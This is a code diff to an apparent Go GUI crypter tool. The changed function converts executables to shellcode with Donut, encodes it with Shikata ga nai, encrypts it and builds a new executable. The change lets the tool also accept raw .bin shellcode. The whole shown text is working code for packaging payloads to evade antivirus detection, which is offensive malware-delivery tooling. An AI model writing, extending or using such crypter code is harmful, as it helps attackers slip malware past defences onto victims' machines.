@@ -334,14 +334,26 @@ func encryptFile(filename string, statusLabel, logLabel *widget.Label, scrollabl
 		return
 	}
 
-	if err := runCommand("./Donut/donut.exe", "-e", "3", "-z", "4", "-b", "3", "-k", "2", "-i", filename); err != nil {
-		statusLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v", err))
-		logLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v\n", err))
+	var binFile string
+	if strings.HasSuffix(strings.ToLower(filename), ".exe") {
+
+		if err := runCommand("./Donut/donut.exe", "-e", "3", "-z", "4", "-b", "3", "-k", "2", "-i", filename); err != nil {
+			statusLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v", err))
+			logLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v\n", err))
+			return
+		}
+		logLabel.SetText(logLabel.Text + "[+] Donut transformation successful\n")
+		binFile = "loader.bin"
+	} else if strings.HasSuffix(strings.ToLower(filename), ".bin") {
+
+		logLabel.SetText(logLabel.Text + "[*] .bin file detected, skipping Donut step\n")
+		binFile = filename
+	} else {
+		statusLabel.SetText("[-] Unsupported file type (must be .exe or .bin)")
+		logLabel.SetText("[-] Unsupported file type (must be .exe or .bin)\n")
 		return
 	}
-	logLabel.SetText(logLabel.Text + "[+] Donut transformation successful\n")
 
-	binFile := "loader.bin"
 	shellcodeFile := "Shikata_ga_nai/shellcode.bin"
 	if err := runCommand("./Shikata_ga_nai/sgn32.exe", "-i", binFile, "-o", shellcodeFile); err != nil {
 		statusLabel.SetText(fmt.Sprintf("[-] Failed to run Shikata ga nai: %v", err))
@@ -359,7 +371,11 @@ func encryptFile(filename string, statusLabel, logLabel *widget.Label, scrollabl
 	encryptData(plaintext, statusLabel, logLabel)
 	scrollableLog.ScrollToBottom()
 
-	cleanupFiles([]string{binFile, shellcodeFile}, logLabel)
+	if binFile == "loader.bin" {
+		cleanupFiles([]string{binFile, shellcodeFile}, logLabel)
+	} else {
+		cleanupFiles([]string{shellcodeFile}, logLabel)
+	}
 
 	logLabel.SetText(logLabel.Text + "[+] Building final executable...\n")
 	buildmain()
